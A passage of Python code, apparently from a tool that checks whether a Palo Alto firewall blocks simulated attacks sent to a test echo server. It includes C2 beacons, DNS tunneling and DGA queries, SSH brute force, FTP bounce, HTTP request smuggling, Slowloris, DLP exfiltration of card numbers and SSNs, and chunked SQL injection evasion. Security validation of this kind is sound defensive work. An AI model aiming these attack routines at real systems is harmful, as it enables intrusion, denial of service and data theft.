                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0',
                'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)',
            ]
            passed = 0
            blocked = 0
            for i, ua in enumerate(uas):
                try:
                    resp = requests.post(url,
                        data=f'{{"seq":{i},"beacon":"true","sleep":60}}',
                        headers={
                            'User-Agent': ua,
                            'X-Beacon-Seq': str(i),
                            'Content-Type': 'application/json',
                        }, timeout=5)
                    if self._is_block_page(resp) or resp.status_code in (403, 406, 503):
                        blocked += 1
                    else:
                        passed += 1
                except (requests.ConnectionError, requests.Timeout, OSError):
                    blocked += 1
                time.sleep(0.5)
            if blocked >= 2:
                return self._blocked_result(test,
                    f'HTTP beacon blocked ({blocked}/3 callbacks intercepted)',
                    url=url, method='POST', sent_payload=payload)
            return self._passthrough_result(test, 200,
                f'HTTP beacon passed through ({passed}/3 callbacks succeeded) — Anti-Spyware may have alerted but did not block. '
                'Change Anti-Spyware profile action from "alert" to "reset-both" for spyware severity medium/high/critical',
                url=url, method='POST', sent_payload=payload)

        return self._error_result(test, f'Unknown malware test: {test.id}')

    def _test_url_filtering(self, test: SecurityTestCase) -> SecurityTestResult:
        """Test URL filtering by accessing categorized URLs."""
        url = self._url_map.get(test.id, '')
        if not url:
            return self._error_result(test, 'No URL configured for this test')
        payload = url
        try:
            resp = requests.get(url, timeout=10, verify=False,
                allow_redirects=True,
                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
            if self._is_block_page(resp):
                return self._blocked_result(test,
                    f'HTTP {resp.status_code} — Block page detected', resp.status_code,
                    resp=resp, url=url, method='GET', sent_payload=payload)
            if resp.status_code == 200:
                return self._passthrough_result(test, resp.status_code,
                    f'URL accessible — not blocked by URL Filtering',
                    resp=resp, url=url, method='GET', sent_payload=payload)
            if resp.status_code in (403, 406, 503):
                return self._blocked_result(test,
                    f'HTTP {resp.status_code} — likely blocked', resp.status_code,
                    resp=resp, url=url, method='GET', sent_payload=payload)
            return self._passthrough_result(test, resp.status_code,
                f'HTTP {resp.status_code} — unclear if blocked',
                resp=resp, url=url, method='GET', sent_payload=payload)
        except (requests.ConnectionError, requests.Timeout, OSError) as e:
            return self._blocked_result(test, f'Connection blocked: {e}',
                url=url, method='GET', sent_payload=payload)

    # PAN-OS DNS sinkhole IPs — when Anti-Spyware sinkholes a query,
    # it replaces the answer with one of these IPs instead of dropping it
    SINKHOLE_IPS = {
        '72.5.65.111',       # PAN-OS default sinkhole IPv4
        '::1',               # PAN-OS default sinkhole IPv6
        '127.0.0.1',         # Common custom sinkhole
        '0.0.0.0',           # Null sinkhole
        '10.0.0.1',          # Vortex echo DNS default (not a real resolution)
        'sinkhole.paloaltonetworks.com',
    }

    def _parse_dig_answer_ip(self, dig_output: str) -> str:
        """Extract the resolved IP from dig ANSWER SECTION."""
        in_answer = False
        for line in dig_output.split('\n'):
            if 'ANSWER SECTION' in line:
                in_answer = True
                continue
            if in_answer and line.strip():
                if line.startswith(';') or not line.strip():
                    break
                parts = line.split()
                if len(parts) >= 5 and parts[3] == 'A':
                    return parts[4]
                break
        return ''

    def _is_sinkholed(self, dig_output: str) -> bool:
        """Check if DNS response was sinkholed by firewall."""
        ip = self._parse_dig_answer_ip(dig_output)
        return ip in self.SINKHOLE_IPS

    def _dns_query(self, host: str, domain: str, qtype: str = 'A',
                   timeout: int = 5) -> tuple:
        """Run dig query, return (output, blocked, sinkholed, error)."""
        try:
            result = subprocess.run(
                ['dig', f'@{host}', domain, qtype, f'+time={timeout}', '+tries=1', '+short'],
                capture_output=True, text=True, timeout=timeout + 5)
            output = result.stdout + result.stderr

            # Also run verbose version for sinkhole detection
            result_v = subprocess.run(
                ['dig', f'@{host}', domain, qtype, f'+time={timeout}', '+tries=1'],
                capture_output=True, text=True, timeout=timeout + 5)
            output_full = result_v.stdout + result_v.stderr

            if result.returncode != 0:
                return output_full, True, False, None
            if 'connection timed out' in output.lower() or 'no servers could be reached' in output.lower():
                return output_full, True, False, None
            if 'REFUSED' in output_full:
                return output_full, True, False, None
            if self._is_sinkholed(output_full):
                return output_full, False, True, None
            return output_full, False, False, None
        except subprocess.TimeoutExpired:
            return '', True, False, None
        except Exception as e:
            return '', False, False, e

    def _test_dns_attack(self, test: SecurityTestCase, host: str) -> SecurityTestResult:
        """Test DNS-based attacks using dig."""
        payload = ATTACK_PAYLOADS.get(test.id, '')

        if test.id == 'dns_tunnel':
            # Send multiple DNS tunnel queries with long encoded subdomains
            domains = payload.split('|')
            blocked = 0
            sinkholed = 0
            total = 0
            all_output = []
            for domain in domains:
                domain = domain.strip()
                if not domain:
                    continue
                total += 1
                # Query TXT record too (common in DNS tunneling)
                for qtype in ['A', 'TXT']:
                    output, is_blocked, is_sink, err = self._dns_query(host, domain, qtype, timeout=5)
                    all_output.append(f'{qtype} {domain}: {"BLOCKED" if is_blocked else "SINKHOLED" if is_sink else "RESOLVED"}')
                    if is_blocked:
                        blocked += 1
                        break
                    if is_sink:
                        sinkholed += 1
                        break
                time.sleep(0.1)  # Rapid queries

            detail_log = '; '.join(all_output[:5])
            if blocked > 0 or sinkholed > 0:
                action = []
                if blocked: action.append(f'{blocked} blocked/dropped')
                if sinkholed: action.append(f'{sinkholed} sinkholed')
                return self._blocked_result(test,
                    f'DNS tunneling detected: {", ".join(action)} of {total} queries. {detail_log}',
                    url=f'dig @{host} [tunnel queries]', method='DNS', sent_payload=payload)
            return self._passthrough_result(test, 0,
                f'All {total} DNS tunnel queries resolved — not blocked. {detail_log}',
                url=f'dig @{host} [tunnel queries]', method='DNS', sent_payload=payload)

        elif test.id == 'dns_dga':
            # Query multiple DGA-like domains
            domains = payload.split('|')
            blocked_count = 0
            sinkholed_count = 0
            resolved_count = 0
            all_output = []
            for domain in domains:
                domain = domain.strip()
                if not domain:
                    continue
                output, is_blocked, is_sink, err = self._dns_query(host, domain, 'A', timeout=3)
                if is_blocked:
                    blocked_count += 1
                    all_output.append(f'{domain}: BLOCKED')
                elif is_sink:
                    sinkholed_count += 1
                    all_output.append(f'{domain}: SINKHOLED')
                else:
                    resolved_count += 1
                    ip = self._parse_dig_answer_ip(output)
                    all_output.append(f'{domain}: RESOLVED ({ip})')
                time.sleep(0.1)

            detail_log = '; '.join(all_output)
            total_blocked = blocked_count + sinkholed_count
            if total_blocked >= len(domains):
                return self._blocked_result(test,
                    f'All {len(domains)} DGA domains blocked/sinkholed. {detail_log}',
                    url=f'dig @{host} [DGA domains]', method='DNS', sent_payload=payload)
            elif total_blocked > 0:
                return self._blocked_result(test,
                    f'{total_blocked}/{len(domains)} DGA domains blocked. {detail_log}',
                    url=f'dig @{host} [DGA domains]', method='DNS', sent_payload=payload)
            return self._passthrough_result(test, 0,
                f'All {resolved_count} DGA domains resolved — not blocked. {detail_log}',
                url=f'dig @{host} [DGA domains]', method='DNS', sent_payload=payload)

        elif test.id == 'dns_rebind':
            # Query domain that could resolve to private IPs
            domain = payload
            output, is_blocked, is_sink, err = self._dns_query(host, domain, 'A', timeout=5)
            if err:
                return self._error_result(test, str(err),
                    url=f'dig @{host} {domain}', method='DNS', sent_payload=payload)
            if is_blocked:
                return self._blocked_result(test,
                    'DNS rebinding query blocked/refused by firewall',
                    url=f'dig @{host} {domain}', method='DNS', sent_payload=payload)
            if is_sink:
                ip = self._parse_dig_answer_ip(output)
                return self._blocked_result(test,
                    f'DNS rebinding query sinkholed (resolved to {ip})',
                    url=f'dig @{host} {domain}', method='DNS', sent_payload=payload)
            ip = self._parse_dig_answer_ip(output)
            return self._passthrough_result(test, 0,
                f'DNS rebinding domain resolved to {ip} — not blocked',
                url=f'dig @{host} {domain}', method='DNS', sent_payload=payload)

        return self._error_result(test, f'Unknown DNS test: {test.id}')

    def _test_protocol_abuse(self, test: SecurityTestCase, host: str,
                              http_port: int) -> SecurityTestResult:
        """Test protocol abuse patterns."""
        payload = ATTACK_PAYLOADS.get(test.id, '')

        if test.id == 'ssh_bruteforce':
            # Rapid SSH login attempts with different credentials using actual SSH auth
            import paramiko
            creds = [c.split(':') for c in payload.split('|') if ':' in c]
            blocked = False
            attempts = 0
            last_error = ''
            for user, passwd in creds[:5]:
                attempts += 1
                try:
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(host, port=2222, username=user, password=passwd,
                                   timeout=5, look_for_keys=False, allow_agent=False,
                                   banner_timeout=5, auth_timeout=5)
                    client.close()
                except paramiko.AuthenticationException:
                    # Auth failed (expected for wrong creds) — but connection was allowed
                    pass
                except (paramiko.SSHException, socket.timeout, ConnectionRefusedError, OSError) as e:
                    last_error = str(e)
                    blocked = True
                    break
                time.sleep(0.1)  # Rapid attempts to trigger brute-force detection
            if blocked:
                return self._blocked_result(test,
                    f'SSH blocked after {attempts} auth attempts — brute-force protection triggered: {last_error}',
                    url=f'ssh://{host}:2222', method='SSH', sent_payload=payload)
            return self._passthrough_result(test, 0,
                f'All {attempts} SSH login attempts completed — brute-force not detected by firewall',
                url=f'ssh://{host}:2222', method='SSH', sent_payload=payload)

        elif test.id == 'ftp_bounce':
            # Attempt FTP PORT command to internal IP
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((host, 21))
                banner = s.recv(1024).decode('utf-8', errors='replace')
                s.sendall(b'USER anonymous\r\n')
                s.recv(1024)
                s.sendall(b'PASS test@test.com\r\n')
                s.recv(1024)
                # Send PORT command targeting internal IP
                port_cmd = f'PORT {payload}\r\n'.encode()
                s.sendall(port_cmd)
                resp = s.recv(1024).decode('utf-8', errors='replace')
                s.sendall(b'QUIT\r\n')
                s.close()
                if '200' in resp or '150' in resp:
                    return self._passthrough_result(test, 0,
                        f'FTP PORT to internal IP accepted — bounce scan possible',
                        url=f'ftp://{host}:21', method='FTP', sent_payload=payload)
                return self._blocked_result(test,
                    f'FTP PORT rejected: {resp.strip()} — bounce scan blocked',
                    url=f'ftp://{host}:21', method='FTP', sent_payload=payload)
            except (socket.timeout, ConnectionRefusedError, OSError) as e:
                return self._blocked_result(test, f'FTP connection failed: {e}',
                    url=f'ftp://{host}:21', method='FTP', sent_payload=payload)

        elif test.id == 'http_smuggle':
            # Send request with conflicting Content-Length and Transfer-Encoding
            url = f'http://{host}:{http_port}/echo'
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((host, http_port))
                smuggle_req = (
                    f'POST /echo HTTP/1.1\r\n'
                    f'Host: {host}:{http_port}\r\n'
                    f'Content-Length: 6\r\n'
                    f'Transfer-Encoding: chunked\r\n'
                    f'\r\n'
                    f'0\r\n'
                    f'\r\n'
                    f'G'
                ).encode()
                s.sendall(smuggle_req)
                resp = s.recv(4096).decode('utf-8', errors='replace')
                s.close()
                if not resp or 'reset' in resp.lower():
                    return self._blocked_result(test,
                        'Connection reset — HTTP smuggling detected and blocked',
                        url=url, method='POST', sent_payload=payload)
                if 'HTTP/1.1 200' in resp or 'HTTP/1.0 200' in resp:
                    return self._passthrough_result(test, 200,
                        'Server accepted smuggled request — not blocked',
                        url=url, method='POST', sent_payload=payload)
                if '400' in resp or '403' in resp:
                    return self._blocked_result(test,
                        f'Server rejected: {resp[:100]} — smuggling blocked',
                        url=url, method='POST', sent_payload=payload)
                return self._passthrough_result(test, 0,
                    f'Response: {resp[:100]}',
                    url=url, method='POST', sent_payload=payload)
            except (socket.timeout, ConnectionRefusedError, OSError) as e:
                return self._blocked_result(test, f'Connection blocked: {e}',
                    url=url, method='POST', sent_payload=payload)

        elif test.id == 'slowloris':
            # Open connection and send partial headers slowly
            url = f'http://{host}:{http_port}/'
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(15)
                s.connect((host, http_port))
                # Send partial HTTP request header
                s.sendall(f'GET / HTTP/1.1\r\nHost: {host}\r\n'.encode())
                # Send additional headers slowly
                blocked = False
                for i in range(5):
                    try:
                        header = f'X-Slowloris-{i}: keep-alive-{i}\r\n'.encode()
                        s.sendall(header)
                        time.sleep(1)
                    except (BrokenPipeError, ConnectionResetError, OSError):
                        blocked = True
                        break
                s.close()
                if blocked:
                    return self._blocked_result(test,
                        'Connection reset during slow headers — Slowloris pattern detected',
                        url=url, method='GET', sent_payload=payload)
                return self._passthrough_result(test, 0,
                    'Slow header sending completed — Slowloris pattern not detected',
                    url=url, method='GET', sent_payload=payload)
            except (socket.timeout, ConnectionRefusedError, OSError) as e:
                return self._blocked_result(test, f'Connection blocked: {e}',
                    url=url, method='GET', sent_payload=payload)

        return self._error_result(test, f'Unknown protocol abuse test: {test.id}')

    def _test_file_threat(self, test: SecurityTestCase, host: str,
                           http_port: int) -> SecurityTestResult:
        """Test file-based threat detection by downloading test files."""
        endpoint = ATTACK_PAYLOADS.get(test.id, '')
        url = f'http://{host}:{http_port}{endpoint}'
        payload = f'Download test file from {endpoint}'

        # Map test IDs to expected file signatures
        file_checks = {
            'pdf_js': (b'%PDF', 'PDF with JavaScript'),
            'office_macro': (b'\xd0\xcf\x11\xe0', 'OLE2 document with VBA macro'),
            'pe_download': (b'MZ', 'PE executable'),
        }

        check = file_checks.get(test.id)
        if not check:
            return self._error_result(test, f'Unknown file threat test: {test.id}')

        magic, desc = check
        try:
            resp = requests.get(url, timeout=10)
            if resp.status_code == 200 and resp.content[:len(magic)] == magic:
                return self._passthrough_result(test, resp.status_code,
                    f'{desc} downloaded successfully — not blocked by firewall',
                    resp=resp, url=url, method='GET', sent_payload=payload)
            if self._is_block_page(resp):
                return self._blocked_result(test,
                    f'HTTP {resp.status_code} — Block page detected for {desc}',
                    resp.status_code, resp=resp, url=url, method='GET', sent_payload=payload)
            if resp.status_code in (403, 406, 503, 502, 504):
                return self._blocked_result(test,
                    f'HTTP {resp.status_code} — {desc} blocked', resp.status_code,
                    resp=resp, url=url, method='GET', sent_payload=payload)
            # HTTP 200 but file signature doesn't match = firewall stripped/replaced content
            if resp.status_code == 200:
                if len(resp.content) == 0:
                    return self._blocked_result(test,
                        f'HTTP 200 but empty response — firewall stripped {desc}',
                        resp.status_code, resp=resp, url=url, method='GET', sent_payload=payload)
                return self._blocked_result(test,
                    f'HTTP 200 but file content modified — firewall neutralized {desc} '
                    f'(expected {magic[:4]}, got {resp.content[:4]})',
                    resp.status_code, resp=resp, url=url, method='GET', sent_payload=payload)
            return self._analyze_response(test, resp, '',
                url=url, method='GET', sent_payload=payload)
        except (requests.ConnectionError, requests.Timeout, OSError) as e:
            return self._blocked_result(test, f'Connection blocked: {e}',
                url=url, method='GET', sent_payload=payload)

    # ─── SSL Decryption Validation ──────────────────────────

    def _test_ssl_decryption(self, test: SecurityTestCase, host: str,
                              https_port: int) -> SecurityTestResult:
        """Test SSL decryption by sending attacks over HTTPS."""
        payload = ATTACK_PAYLOADS.get(test.id, '')

        if test.id == 'ssl_eicar':
            url = f'https://{host}:{https_port}/eicar'
            try:
                resp = requests.get(url, timeout=10, verify=False)
                if resp.status_code == 200 and b'EICAR' in resp.content:
                    return self._passthrough_result(test, resp.status_code,
                        'EICAR downloaded over HTTPS — SSL Decryption is NOT active or Anti-Virus profile not attached',
                        resp=resp, url=url, method='GET', sent_payload=payload)
                if resp.status_code == 200:
                    return self._blocked_result(test,
                        'HTTP 200 but EICAR content stripped over HTTPS — SSL Decryption + Anti-Virus working',
                        resp.status_code, resp=resp, url=url, method='GET', sent_payload=payload)
                return self._analyze_response(test, resp, 'EICAR',
                    url=url, method='GET', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test, f'HTTPS connection blocked: {e}',
                    url=url, method='GET', sent_payload=payload)

        elif test.id == 'ssl_c2':
            url = f'https://{host}:{https_port}/echo'
            c2_data = payload
            try:
                resp = requests.post(url, data=c2_data,
                    headers={
                        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
                        'X-Request-ID': 'deadbeef-cafe-babe-feed-c0ffee000001',
                        'Cookie': 'session=YWRtaW46cGFzc3dvcmQ=',
                    }, timeout=10, verify=False)
                return self._analyze_response(test, resp, c2_data,
                    url=url, method='POST', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test, f'HTTPS connection blocked: {e}',
                    url=url, method='POST', sent_payload=payload)

        else:
            # ssl_sqli, ssl_xss, ssl_cmdi — GET with raw payload over HTTPS
            # Do NOT URL-encode: firewall must see the raw attack characters
            url = f'https://{host}:{https_port}/echo?payload={payload}'
            try:
                resp = requests.get(url, timeout=10, verify=False)
                return self._analyze_response(test, resp, payload,
                    url=url, method='GET', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test, f'HTTPS connection blocked: {e}',
                    url=url, method='GET', sent_payload=payload)

    # ─── App-ID Validation ───────────────────────────────────

    def _test_appid_validation(self, test: SecurityTestCase, host: str,
                                https_port: int) -> SecurityTestResult:
        """Test App-ID by sending wrong protocol on standard ports.

        App-ID tests work by sending protocol-specific bytes on mismatched ports.
        The firewall should identify the real application (not just the port) and
        block or reset the session if the policy doesn't allow that app on that port.

        Key: the firewall typically allows the initial TCP handshake, then inspects
        the first few packets. If App-ID detects a disallowed app, it sends a RST
        which may arrive AFTER we already got some data from the server. So we must
        check whether the response is from the REAL protocol (SSH banner, FTP response,
        DNS answer) vs just the server's default response (nginx TLS/HTTP).
        """
        payload = ATTACK_PAYLOADS.get(test.id, '')

        if test.id == 'appid_ssh_on_443':
            url = f'TCP {host}:443'
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((host, 443))
                s.sendall(b'SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1\r\n')
                resp_data = s.recv(1024)
                s.close()
                resp_str = resp_data.decode('utf-8', errors='replace')
                if 'SSH' in resp_str:
                    return self._passthrough_result(test, 0,
                        f'SSH handshake on port 443 succeeded — App-ID did not block SSH on HTTPS port. '
                        f'Add a security policy to deny SSH application on this zone/port. Response: {resp_str[:100]}',
                        url=url, method='TCP', sent_payload=payload)
                # Server responded with non-SSH data (e.g. TLS handshake from nginx).
                # This means our SSH bytes reached the server but the server didn't speak SSH.
                # The firewall allowed the connection — App-ID may have identified it as
                # "unknown-tcp" rather than blocking it. Try sending more data to trigger App-ID.
                try:
                    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s2.settimeout(5)
                    s2.connect((host, 443))
                    # Send SSH banner + additional SSH key exchange init to give App-ID more to inspect
                    s2.sendall(b'SSH-2.0-OpenSSH_8.9p1\r\n')
                    time.sleep(1)  # Give firewall time to identify
                    s2.sendall(b'\x00\x00\x00\x1c\x0a\x14' + os.urandom(16) + b'\x00\x00\x00\x00')
                    resp2 = s2.recv(1024)
                    s2.close()
                    return self._passthrough_result(test, 0,
                        f'SSH traffic on port 443 was not blocked by App-ID. '
                        f'Configure security policy to block SSH application regardless of port',
                        url=url, method='TCP', sent_payload=payload)
                except (ConnectionResetError, BrokenPipeError, socket.timeout):
                    return self._blocked_result(test,
                        'App-ID identified SSH on port 443 and reset the connection after initial handshake',
                        url=url, method='TCP', sent_payload=payload)
            except (ConnectionResetError, ConnectionRefusedError, BrokenPipeError) as e:
                return self._blocked_result(test,
                    f'SSH on port 443 blocked — App-ID identified non-HTTPS traffic: {e}',
                    url=url, method='TCP', sent_payload=payload)
            except (socket.timeout, OSError) as e:
                return self._blocked_result(test,
                    f'Connection to port 443 timed out/blocked: {e}',
                    url=url, method='TCP', sent_payload=payload)

        elif test.id == 'appid_http_on_8080':
            # This test validates that App-ID correctly identifies HTTP (web-browsing)
            # on a non-standard port. PASS = App-ID identifies it (connection works).
            # FAIL = connection blocked (App-ID or port rule prevented it).
            url = f'http://{host}:8082/'
            try:
                resp = requests.get(url, timeout=10,
                    headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'text/html'})
                if resp.status_code == 200:
                    return self._blocked_result(test,
                        'HTTP on port 8082 succeeded — App-ID correctly identified web-browsing application on non-standard port',
                        resp.status_code, resp=resp, url=url, method='GET', sent_payload=payload)
                return self._blocked_result(test,
                    f'HTTP {resp.status_code} on port 8082 — App-ID identified the application',
                    resp.status_code, resp=resp, url=url, method='GET', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._passthrough_result(test, 0,
                    f'HTTP on port 8082 blocked — App-ID or port-based rule prevented web-browsing on non-standard port: {e}',
                    url=url, method='GET', sent_payload=payload)

        elif test.id == 'appid_ftp_on_443':
            url = f'TCP {host}:443'
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((host, 443))
                s.sendall(b'USER anonymous\r\n')
                resp_data = s.recv(1024)
                # Check if we got an actual FTP response (220, 230, 331, etc.)
                resp_str = resp_data.decode('utf-8', errors='replace')
                if any(code in resp_str for code in ['220 ', '230 ', '331 ', '530 ']):
                    s.close()
                    return self._passthrough_result(test, 0,
                        f'FTP response on port 443 — App-ID did not block FTP on HTTPS port: {resp_str[:100]}',
                        url=url, method='TCP', sent_payload=payload)
                # Got response but not FTP — server's nginx TLS. Try to sustain the session.
                try:
                    s.sendall(b'PASS test@test.com\r\n')
                    time.sleep(1)
                    s.sendall(b'LIST\r\n')
                    resp2 = s.recv(1024)
                    s.close()
                    return self._passthrough_result(test, 0,
                        'FTP commands on port 443 were not blocked by App-ID',
                        url=url, method='TCP', sent_payload=payload)
                except (ConnectionResetError, BrokenPipeError, socket.timeout):
                    s.close()
                    return self._blocked_result(test,
                        'App-ID identified FTP protocol on port 443 and reset the connection',
                        url=url, method='TCP', sent_payload=payload)
            except (ConnectionResetError, ConnectionRefusedError, BrokenPipeError) as e:
                return self._blocked_result(test,
                    f'FTP on port 443 blocked — App-ID identified non-HTTPS traffic: {e}',
                    url=url, method='TCP', sent_payload=payload)
            except (socket.timeout, OSError) as e:
                return self._blocked_result(test,
                    f'Connection timed out/blocked: {e}',
                    url=url, method='TCP', sent_payload=payload)

        elif test.id == 'appid_dns_on_80':
            url = f'TCP {host}:80'
            try:
                # Build minimal DNS A query for example.com
                txid = b'\x12\x34'
                flags = b'\x01\x00'  # standard query, recursion desired
                qdcount = b'\x00\x01'
                ancount = b'\x00\x00'
                nscount = b'\x00\x00'
                arcount = b'\x00\x00'
                header = txid + flags + qdcount + ancount + nscount + arcount
                # example.com as DNS labels
                qname = b'\x07example\x03com\x00'
                qtype = b'\x00\x01'   # A record
                qclass = b'\x00\x01'  # IN
                query = header + qname + qtype + qclass
                # DNS over TCP: prepend 2-byte length
                tcp_dns = struct.pack('!H', len(query)) + query

                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((host, 80))
                s.sendall(tcp_dns)
                resp_data = s.recv(1024)
                # Check if response looks like a DNS answer (starts with our txid + response flags)
                if len(resp_data) >= 4 and resp_data[0:2] == txid and (resp_data[2] & 0x80):
                    s.close()
                    return self._passthrough_result(test, 0,
                        f'DNS answer received on port 80 — App-ID did not block DNS on HTTP port',
                        url=url, method='TCP', sent_payload=payload)
                # Got non-DNS response (likely HTTP error from nginx). Try more data.
                try:
                    s.sendall(tcp_dns)  # Send another DNS query
                    time.sleep(1)
                    resp2 = s.recv(1024)
                    s.close()
                    # Nginx will likely return an HTTP 400 Bad Request for binary data
                    resp_str = resp2.decode('utf-8', errors='replace') if resp2 else ''
                    if '400' in resp_str or 'Bad Request' in resp_str:
                        return self._blocked_result(test,
                            'DNS binary data on port 80 rejected — server returned HTTP 400. '
                            'App-ID identified non-HTTP traffic on port 80',
                            url=url, method='TCP', sent_payload=payload)
                    return self._passthrough_result(test, 0,
                        'DNS traffic on port 80 was not blocked by App-ID',
                        url=url, method='TCP', sent_payload=payload)
                except (ConnectionResetError, BrokenPipeError, socket.timeout):
                    s.close()
                    return self._blocked_result(test,
                        'App-ID identified DNS protocol on port 80 and reset the connection',
                        url=url, method='TCP', sent_payload=payload)
            except (ConnectionResetError, ConnectionRefusedError, BrokenPipeError) as e:
                return self._blocked_result(test,
                    f'DNS on port 80 blocked — App-ID identified non-HTTP traffic: {e}',
                    url=url, method='TCP', sent_payload=payload)
            except (socket.timeout, OSError) as e:
                return self._blocked_result(test,
                    f'Connection timed out/blocked: {e}',
                    url=url, method='TCP', sent_payload=payload)

        return self._error_result(test, f'Unknown App-ID test: {test.id}')

    # ─── Data Exfiltration / DLP ─────────────────────────────

    def _test_data_exfiltration(self, test: SecurityTestCase, host: str,
                                 http_port: int) -> SecurityTestResult:
        """Test data exfiltration / DLP detection."""
        payload = ATTACK_PAYLOADS.get(test.id, '')

        if test.id in ('exfil_credit_card', 'exfil_ssn', 'exfil_bulk_data'):
            url = f'http://{host}:{http_port}/echo'
            try:
                resp = requests.post(url, data=payload,
                    headers={
                        'Content-Type': 'text/plain',
                        'X-Data-Export': 'employee-records',
                    }, timeout=10)
                # Data Filtering inspects the outbound POST body for sensitive
                # data patterns (CC numbers, SSNs).  If the POST succeeds with
                # HTTP 200 the data was exfiltrated — FAIL.
                if self._is_block_page(resp):
                    return self._blocked_result(test,
                        f'HTTP {resp.status_code} — Data Filtering blocked sensitive data exfiltration',
                        resp.status_code, resp=resp, url=url, method='POST', sent_payload=payload)
                if resp.status_code in (403, 406, 502, 503, 504):
                    return self._blocked_result(test,
                        f'HTTP {resp.status_code} — Data Filtering blocked outbound data',
                        resp.status_code, resp=resp, url=url, method='POST', sent_payload=payload)
                if resp.status_code == 200:
                    data_type = {
                        'exfil_credit_card': 'credit card numbers',
                        'exfil_ssn': 'Social Security Numbers',
                        'exfil_bulk_data': 'bulk PII (credit cards, SSNs, emails)',
                    }.get(test.id, 'sensitive data')
                    return self._passthrough_result(test, resp.status_code,
                        f'POST with {data_type} accepted (HTTP 200) — Data Filtering did not detect sensitive data in the request body. '
                        'Verify Data Filtering profile is attached to the security rule and configured to detect SSN/CC patterns',
                        resp=resp, url=url, method='POST', sent_payload=payload)
                return self._passthrough_result(test, resp.status_code,
                    f'HTTP {resp.status_code} — data exfiltration not blocked',
                    resp=resp, url=url, method='POST', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test,
                    f'Connection blocked — Data Filtering detected sensitive data exfiltration: {e}',
                    url=url, method='POST', sent_payload=payload)

        elif test.id == 'exfil_dns_data':
            domains = payload.split('|')
            blocked_count = 0
            sinkholed_count = 0
            all_output = []
            for domain in domains:
                output, blocked, sinkholed, error = self._dns_query(host, domain)
                status = 'BLOCKED' if blocked else 'SINKHOLED' if sinkholed else 'RESOLVED'
                all_output.append(f'{domain[:30]}...: {status}')
                if blocked:
                    blocked_count += 1
                if sinkholed:
                    sinkholed_count += 1
            detail_str = '; '.join(all_output)
            if blocked_count + sinkholed_count >= 2:
                return self._blocked_result(test,
                    f'DNS exfiltration intercepted ({blocked_count} blocked, {sinkholed_count} sinkholed)',
                    url=f'DNS @{host}', method='DNS', sent_payload=payload)
            return self._passthrough_result(test, 0,
                f'DNS exfiltration queries resolved — data leaked: {detail_str}',
                url=f'DNS @{host}', method='DNS', sent_payload=payload)

        elif test.id == 'exfil_http_headers':
            parts = payload.split('|')
            url = f'http://{host}:{http_port}/echo?payload=header-exfil-test'
            headers_dict = {
                'X-Session-Data': parts[0] if len(parts) > 0 else '',
                'X-Debug-Info': parts[1] if len(parts) > 1 else '',
                'X-Trace-ID': parts[2] if len(parts) > 2 else '',
            }
            try:
                resp = requests.get(url, headers=headers_dict, timeout=10)
                # Sensitive data is in HTTP headers, not the body/URL.
                # Echo server only echoes ?payload= ("header-exfil-test"), not headers.
                # If firewall allows the request → HTTP 200 → FAIL.
                if self._is_block_page(resp):
                    return self._blocked_result(test,
                        f'HTTP {resp.status_code} — Block page detected for header data exfiltration',
                        resp.status_code, resp=resp, url=url, method='GET', sent_payload=payload)
                if resp.status_code in (403, 406, 502, 503, 504):
                    return self._blocked_result(test,
                        f'HTTP {resp.status_code} — header data exfiltration blocked',
                        resp.status_code, resp=resp, url=url, method='GET', sent_payload=payload)
                if resp.status_code == 200:
                    return self._passthrough_result(test, resp.status_code,
                        'Sensitive data in HTTP headers passed through — Data Filtering did not inspect custom headers',
                        resp=resp, url=url, method='GET', sent_payload=payload)
                return self._passthrough_result(test, resp.status_code,
                    f'HTTP {resp.status_code} — header data not blocked',
                    resp=resp, url=url, method='GET', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test, f'Connection blocked: {e}',
                    url=url, method='GET', sent_payload=payload)

        return self._error_result(test, f'Unknown exfiltration test: {test.id}')

    # ─── Evasion Techniques ──────────────────────────────────

    def _test_evasion_technique(self, test: SecurityTestCase, host: str,
                                 http_port: int) -> SecurityTestResult:
        """Test evasion techniques — encoded/obfuscated attack payloads."""
        payload = ATTACK_PAYLOADS.get(test.id, '')

        if test.id == 'evasion_chunked':
            # Raw socket HTTP with chunked transfer encoding
            url = f'http://{host}:{http_port}/echo'
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((host, http_port))
                # Split SQL injection across chunks
                chunks = ["' UNION ", "SELECT user", "name,password ", "FROM users--"]
                body_parts = []
                for chunk in chunks:
                    body_parts.append(f'{len(chunk):x}\r\n{chunk}\r\n')
                body_parts.append('0\r\n\r\n')
                chunked_body = ''.join(body_parts)
                http_req = (
                    f'POST /echo HTTP/1.1\r\n'
                    f'Host: {host}:{http_port}\r\n'
                    f'Transfer-Encoding: chunked\r\n'
                    f'Content-Type: application/x-www-form-urlencoded\r\n'
                    f'Connection: close\r\n'
